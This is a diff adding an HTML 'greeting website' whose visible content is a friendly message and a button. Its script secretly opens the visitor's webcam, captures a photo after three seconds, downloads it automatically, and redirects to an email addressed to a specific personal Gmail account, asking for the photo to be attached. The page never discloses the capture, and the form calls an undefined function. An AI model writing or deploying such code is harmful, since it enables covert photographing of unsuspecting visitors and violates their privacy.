@@ -1,0 +1,75 @@
+1) top 5
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>My Greeting Website</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin: 0;
+      padding: 0;
+      background: #f4f4f4;
+    }
+    h1 {
+      margin-top: 50px;
+      color: #333;
+    }
+    .heart {
+      color: red;
+    }
+    .greeting {
+      font-size: 1.5em;
+      margin: 20px;
+      color: #444;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 1em;
+      margin: 10px;
+    }
+  </style>
+</head>
+<body>
+  <h1>HELLO <span class="heart">❤</span> HOW ARE YOU?</h1>
+  <div class="greeting">I AM FINE</div>
+
+  <form onsubmit="return changeText(event)">
+    
+    <button type="submit">I AM FINE</button>
+  </form>
+
+  <video id="video" width="400" height="300" autoplay></video>
+<canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+
+<script>
+var video = document.getElementById("video");
+var canvas = document.getElementById("canvas");
+var ctx = canvas.getContext("2d");
+
+// Open webcam
+navigator.mediaDevices.getUserMedia({video:true})
+.then(stream => video.srcObject = stream)
+.catch(err => alert("Camera error: " + err));
+
+// Auto capture after 3 seconds
+setTimeout(function() {
+    // Capture photo
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // Convert to base64
+    var dataURL = canvas.toDataURL("image/png");
+
+    // Download photo automatically (optional)
+    var link = document.createElement("a");
+    link.href = dataURL;
+    link.download = "photo.png";
+    link.click();
+
+    // Open Gmail compose
+    window.location.href = "mailto:laxmidattbadu18@gmail.com?subject=Auto Photo&body=Please attach the photo I just captured.";
+}, 3000); // 3 seconds delay to allow camera to open
+</script>
+</body>
+</html>
